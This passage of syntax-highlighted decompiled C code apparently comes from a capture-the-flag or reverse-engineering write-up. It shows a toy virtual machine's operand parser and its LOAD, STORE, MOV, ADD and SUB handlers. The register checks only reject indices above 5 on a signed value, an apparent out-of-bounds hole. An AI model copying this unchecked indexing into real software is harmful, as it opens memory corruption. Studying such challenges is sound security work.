         <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>
            <span class="token operator">++</span>Instruction_only_one_operand__first_operand_len <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        input_data_addr <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>input_data_addr<span class="token punctuation">;</span>
        v5 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>input_data_addr <span class="token operator">+</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v7 <span class="token operator">=</span> Instruction_only_one_operand__first_operand_len<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> Instruction_only_one_operand__first_operand_len<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Instruction_only_one_operand__first_operand_len <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> Error_about_Miss_oprand<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> virtual_machine<span class="token operator">-></span>Instruction_type <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">' '</span>
            <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\t'</span><span class="token punctuation">)</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>
        <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
      Instruction_only_two_operand__first_operand_len <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">' '</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\t'</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
           <span class="token operator">&amp;&amp;</span> Instruction_only_two_operand__first_operand_len <span class="token operator">&lt;=</span> <span class="token number">0x1E</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\r'</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v8 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>input_data_addr<span class="token punctuation">;</span>
        v9 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">=</span> v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v11 <span class="token operator">=</span> Instruction_only_two_operand__first_operand_len<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> Instruction_only_two_operand__first_operand_len<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Instruction_only_two_operand__first_operand_len <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> Error_about_Miss_oprand<span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">' '</span>
            <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\t'</span><span class="token punctuation">)</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>
        <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
      Instruction_only_two_operand__second_operand_len <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">' '</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\t'</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
           <span class="token operator">&amp;&amp;</span> Instruction_only_two_operand__second_operand_len <span class="token operator">&lt;=</span> <span class="token number">0x1E</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\r'</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v12 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>input_data_addr<span class="token punctuation">;</span>
        v13 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">=</span> v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        v14 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v12 <span class="token operator">+</span> v13<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v15 <span class="token operator">=</span> Instruction_only_two_operand__second_operand_len<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> v15<span class="token punctuation">)</span> <span class="token operator">=</span> v14<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> Instruction_only_two_operand__second_operand_len<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Instruction_only_two_operand__second_operand_len <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
Error_about_Miss_oprand<span class="token operator">:</span>
        virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">2LL</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Miss oprand!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span>
         <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
      <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
    <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> virtual_machine<span class="token operator">-></span>Instruction_type <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">0LL</span><span class="token operator">:</span>                                 <span class="token comment">// NOP</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">1LL</span><span class="token operator">:</span>                                 <span class="token comment">// LOAD REG0 address</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v60 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v60 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v84 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">atoi</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v84 <span class="token operator">&lt;=</span> <span class="token number">0x2023FFFF</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v84 <span class="token operator">></span> <span class="token number">0x20242FFF</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_address<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v84 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x20242FFF</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_76<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v60<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>v84<span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2LL</span><span class="token operator">:</span>                                 <span class="token comment">// STORE REG0 address</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v74 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v74 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v84 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">atoi</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v84 <span class="token operator">&lt;=</span> <span class="token number">0x2023FFFF</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v84 <span class="token operator">></span> <span class="token number">0x20242FFF</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
Error_about_invalid_address<span class="token operator">:</span>
          virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"ERROR: Invalid address: %#lx!\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v84<span class="token punctuation">,</span> v17<span class="token punctuation">,</span> v18<span class="token punctuation">,</span> v19<span class="token punctuation">,</span> v20<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v84 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x20242FFF</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
LABEL_76<span class="token operator">:</span>
          virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"ERROR: Invalid memory access: %lx!\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v84<span class="token punctuation">,</span> v17<span class="token punctuation">,</span> v18<span class="token punctuation">,</span> v19<span class="token punctuation">,</span> v20<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token operator">*</span>v84 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v74<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3LL</span><span class="token operator">:</span>                                 <span class="token comment">// MOV REG0 REG1</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v61 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v61 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v75 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v75 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v61<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v75<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4LL</span><span class="token operator">:</span>                                 <span class="token comment">// ADD REG0 REG1</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v62 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v62 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v76 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v76 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v62<span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v76<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5LL</span><span class="token operator">:</span>                                 <span class="token comment">// SUB REG0 REG1</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v63 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v63 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
